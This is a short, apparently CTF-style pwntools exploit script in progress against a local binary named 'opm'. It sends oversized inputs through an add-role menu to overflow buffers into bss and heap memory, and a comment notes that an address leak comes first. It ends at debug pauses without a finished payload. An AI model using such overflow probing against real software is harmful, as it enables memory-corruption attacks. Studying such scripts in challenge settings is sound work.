from pwn import *

context.log_level = "debug"

p = process("./opm")

print p.recv()


def addrole(name, punch):

    p.sendline("A")
    print p.recv()
    p.sendline(name)
    print p.recv()
    p.sendline(punch)
    print p.recv()

def showrole():

    p.sendline("S")
    return p.recv()

#try to leak address first!


addrole("a"*80, str(123)) #write to bss & heap middle.
raw_input("1.")
addrole("a"*128 + chr(0x30), str(123)) #write to bss & heap middle.
raw_input("2.")
addrole("a"*128, str(123).ljust(0x80,"c") + chr(0x30)) #write to bss & heap middle.
raw_input("3.")
